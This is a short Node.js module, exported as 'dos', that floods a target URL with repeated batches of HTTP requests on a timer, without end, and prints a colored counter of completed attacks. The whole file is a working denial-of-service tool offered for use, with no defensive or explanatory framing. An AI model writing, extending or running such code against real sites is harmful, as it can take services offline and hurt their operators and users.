const req = require('request')

const dos = (url, qty, ms) => {
    let err = ok = 0
    let attacked = 0
    setInterval(_ => {

        for (let i = qty; i--;)
            req(url, error => !error ? ok++ : err++)

            attacked++
            console.log('[\x1b[31m+\x1b[37m] - +200 request (˚▽˚’!)/ [\x1b[31m'+attacked+"\x1b[37m]")

        err = ok = 0

    }, ms)
}

module.exports = dos